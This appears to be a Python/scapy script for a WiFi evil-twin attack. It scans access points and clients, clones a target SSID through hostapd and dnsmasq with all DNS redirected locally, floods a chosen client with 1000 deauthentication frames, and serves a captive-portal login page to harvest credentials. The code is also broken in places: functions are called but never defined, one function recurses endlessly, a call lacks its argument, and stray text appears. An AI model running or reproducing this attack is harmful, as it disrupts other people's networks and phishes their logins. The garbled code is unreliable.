from scapy.all import * 
import os
import sys
import threading
import time
import logging
import signal


iface = ""
net_stick_iface = ""
users_list = []
ap_list = []
ssid_list = []
ap_mac = ""



#First we have to enter into monitor mode so start_monitor_mode will be called in the main func

def start_monitor_mode(iface):
	# Eliminate interfing processes
	os.system("sudo airmon-ng check kill")
	
	# Change interface to monitor mode
	os.system("sudo airmon-ng start "+ iface)
	os.system("clear")
	
	#Rename interface to MonitorMode
	iface = str(iface)+'M'
	
	return iface

def stop_monitor_mode(iface):
	# Stop monitor mode interface
    os.system("sudo airmon-ng stop "+ iface)

	# Start normal/managed interface mode
    os.system("sudo systemctl start NetworkManager") #NetworkManager renames interface back normally imlicitly
    os.system("clear")



def set_hostapd(iface, ssid = "DareToConnect"):
	interface_str = "interface=" + str(iface) + "\n"
	driver_str    = "driver=nl80211"          + "\n"
	ssid_str      = "ssid=" + str(ssid)       + "\n"
	channel_str   = "channel=1"               + "\n"
	band_str      = "hw_mode=g"               + "\n" #2.4GHz band
	visible_str   = "ignore_broadcast_ssid=0" + "\n" #Makes AP visible to all

	#Merging all conf lines and writing to file
	conf_str      = interface_str + driver_str + ssid_str + channel_str
	with open("hostapd.conf", "w+") as f:
		f.write(conf_str)
		
	#Changing path                 idk
	os.chmod("hostapd.conf", 0o777)
	return


def set_dnsmask(iface):
	interface_str = "interface=" + str(iface)           + "\n"
	range_str     = "dhcp-range=10.0.0.3,10.0.0.20,12h" + "\n"
	option1_str   = "dhcp-option=3,10.0.0.1"            + "\n"
	option2_str   = "dhcp-option=6,10.0.0.1"            + "\n"
	address_str   = "address=/#/10.0.0.1"               + "\n"
	server_str    = "server=8.8.8.8"                    + "\n"
	log_str       = "log-queries \nlog-dhc"				+ "\n"
	
	#Merging all conf lines and writing to file
	conf_str      = interface_str + range_str + option1_str + option2_str + address_str
	with open("dnsmasq.conf", "w+") as f:
		f.write(conf_str)
		
	#Changing path                 idk
	os.chmod("dnsmasq.conf",0o777)
	return
	
def set_iptables(iface):
	str1 = "iptables --flush" + "\n"
	str2 = "iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE" + "\n"
	str3 = "iptables --append FORWARD --in-interface" + str(iface) + "-j ACCEPT" + "\n"
	str4 = "iptables -t nat -A POSTROUTING -j MASQUERADE" + "\n"
	str5 = "echo 1 > /proc/sys/net/ipv4/ip_forward" + "\n"

	#Merging all commands and writing to file
	conf_str = str1 + str2 + str3 + str4 + str5
	with open("iptablesRules.sh", "w+") as f:
		f.write(conf_str)
		
	#Changing path                 idk
	os.chmod("iptablesRules.sh", 0o777)
	return

def edit_apacherules():
	str1 = '<Directory "/var/www/html"> \n'
	str2 = ("	RewriteEngine On" + "\n"
			"	RewriteBase /" + "\n"
			"	RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]" + "\n"
			"	RewriteRule ^(.*)$ http://%1/$1 [R=301,L]" + "\n"
								
			"	RewriteCond %{REQUEST_FILENAME} !-f" + "\n"
			"	RewriteCond %{REQUEST_FILENAME} !-d" + "\n"
			"	RewriteRule ^(.*)$ / [L,QSA]" + "\n"
			"</Directory>" + "\n"
			)
	edit_str = str1 + str2
	with open("/etc/apache2/sites-enabled/000-default.conf", "a+") as f:
		f.write(edit_str)
	return edit_apacherules()		
	




def start_apache():
    os.system('service apache2 start')
    os.system('route add default gw 10.0.0.1')
    
    
    
    # the  captive portal we want to show  can be introduce using apache server by adding the web files in the format ------------> os.system('cp file_you_want_to_copy /var/www/ ')
   














def reset_setting():
	#Start normal/managed interface mode
    os.system('service NetworkManager start')
    os.system('service apache2 stop')
    os.system('service hostapd stop')
    os.system('service dnsmasq stop')
    #os.system('service rpcbind stop')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl start systemd-resolved >/dev/null 2>&1')

def run_captive_portal():
    from flask import Flask, request, render_template

    app = Flask(__name__)

    # Replace these with your actual credentials and valid users
    VALID_USERS = {
        "admin": "password"
    }

    @app.route("/", methods=["GET", "POST"])
    def login():
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")

            if authenticate_user(username, password):
                # Redirect to success page or the internet
                return render_template("success.html", username=username)
            else:
                return render_template("login.html", error="Invalid credentials. Please try again.")

        return render_template("login.html", error="")

    def authenticate_user(username, password):
        return username in VALID_USERS and VALID_USERS[username] == password

    if __name__ == "__main__":
        app.run(host="0.0.0.0", port=80)


# for  monitoring the access point available  
def Wifi_scaning():
    print("Scanning for access points...")
    print("press CTRL+C to stop the scanning")
    print("index         MAC            SSID")
    sniff(iface = iface, prn = PacketHandler)
    
    
# Extracted Packet Format 
Pkt_Info = """
---------------[ Packet Captured ]-----------------------
 Subtype 	: {}
 Address 1 	: {}
 Address 2	: {} [BSSID]
 Address 3 	: {}
 Address 4	: {}
 AP		    : {} [SSID]
"""

# Founded Access Point List
ap_list = []

# For Extracting Available Access Points
def PacketHandler(pkt) :
	#
	# pkt.haslayer(scapy.Dot11Elt)
	#
	# 	This Situation Help Us To Filter Dot11Elt Traffic From
	# 	Various Types Of Packets
	#
	# pkt.type == 0 
	#
	#	This Filter Help Us To Filter Management Frame From Packet
	#
	# pkt.subtype == 8 
	#
	#	This Filter Help Us To Filter Becon From From Captured Packets
	#
	# p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp)
	if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
		# 
		# This Function Will Verify Not To Print Same Access Point Again And Again
		#
		if pkt.addr2 not in ap_list:
			#
			# Append Access Point
			#
			ap_list.append(pkt.addr2)
            #
			# Append Access Point names
			#			
			ssid_list.append(pkt.info)
			# Print Packet Informations
			#
 			print(len(ap_list),'     %s     %s '%( pkt.addr2, pkt.info))
 			
# once we etract the ap we need to know the connected users list to that ap

def Users_scaning():
    print("Finds connected Clients")
    print("press CTRL+C to stop the scanning")
    print ("index       Client MAC")
    sniff (iface = iface, prn = PacketHandler2)
    
def PacketHandler2(pkt):
    global users_list
    if pkt.addr2 not in ap_list and pkt.addr3 == ap_mac and pkt.addr2 not in users_list:
        users_list.append(pkt.addr2)
        print(len(users_list),"     " ,pkt.addr2)
        

        
        




#Disconnects the target from the network
'''Scapy has a packet class Dot11Deauth() that does exactly what we are looking for. It takes an 802.11 reason 
code as a parameter, and we'll choose a value of 7 for now (which is a frame received from a nonassociated station)
'''
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
def disconnection(target_mac, gateway_mac, iface):
	dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
	# stack them up
	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
	# send the packet
	sendp(packet, inter=0.3, count=1000, iface=iface,verbose=1)
	return
'''
This is basically the access point requesting a deauthentication from the target; that is why we set the destination 
MAC address to the target device's MAC address, and the source MAC address to the access point's MAC address,
and then we send the stacked frame 1000 times each 0.3s, this will cause a deauthentication for 10 seconds.
'''

        
#assigning interface and adding the routing table
#we need to assign the interface a network gateway and a netmask
def gateway():
    os.system("ifconfig "+ iface +" 10.0.0.1 netmask 255.255.255.0")
    os.system("route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1")



# for turning on the fake access point and enabling dns masking
def create_conf_file(iface, ssid):
    set_hostapd(iface, ssid)
    set_dnsmasq(iface)


def main():
    global iface, ap_mac
    iface = input("Please enter the first interface name: ")  # for sniffing users
    iface2 = input("Please enter the second interface name: ")  # for creating fake AP

    # Step 1: Change the first interface to monitor mode
    iface = start_monitor_mode(iface)

    print("Evil twin attack started")
    gateway()  # In order to assign a gateway to the interface
    Wifi_scaning()

    # Choose access point to attack
    if len(ap_list) > 0:
        mac_adder = int(input("\nEnter the index of the SSID you want to attack: ")) - 1
        ap_mac = ap_list[mac_adder]
        ssid_name = ssid_list[mac_adder]
        # For creating the fake AP, we need to create a configuration file
        set_hostapd(iface2, ssid_name)
        set_dnsmasq(iface2)
        Users_scaning()

    # Choose user to attack
    if len(users_list) > 0:
        user_adder = int(input("\nEnter the index of the client you want to attack: ")) - 1
        user_mac = users_list[user_adder]

    # Then we need to carry out the deauthentication attack to overpower the legitimate AP
    disconnection(user_mac, ap_mac, iface)

    # Once the user is connected to the fake AP, we need to provide the user with internet access
    set_iptables()

    # In order to host the captive portal website, run the Flask captive portal server
    start_apache()
    run_captive_portal()

    # After all the work, stop monitor mode and reset network settings
    stop_monitor_mode(iface)
    reset_settings()

if __name__ == "__main__":
    main()


# def main():
#     global iface ,ap_mac
#     iface = input("please enter the first interface name: ") #for sniffing users
#     iface2= input("Please enter the second interface name: ") #for creating fake AP 
#     #step 1: Change the first interface to monitor mode:
#     iface = start_monitor_mode()
#     print("Evil twin attack started")
#     gateway() #inorder to assign gateway to the interface
#     Wifi_scaning() 
#     # Choose access point to attack
#     if len(ap_list) > 0 : 
#         mac_adder = int(input("\nEnter the index of the ssid you want to attack: ")) -1
#         ap_mac = ap_list[mac_adder]
#         ssid_name = ssid_list[mac_adder]
#         # for creating the fake AP we need 2 '.conf' files
#         create_conf_file(iface2 , ssid_name)
#         Users_scaning()
#     #Choose user to attack
#     if len(users_list) > 0 :
#         user_adder = int(input("\nEnter the index of the client you want to attack: ")) -1
#         user_mac = users_list[user_adder]
    
#     # then we need to carry out disconnection attack in order to overpower our ap
    
#     disconnection(user_mac ,ap_mac , iface)
    
#     #once the user is connected to the fake ap  we need to provide the user with internet acess 
#     #so we need to forward trafic form eth0
#     set_iptables()
    
#     # in order to host the captive portal website
    
    
#     edit_apacherules()
#     start_apacherules()
    
    
# # after all the work
# stop_monitor_mode()
# reset_settings()

     ma








 			






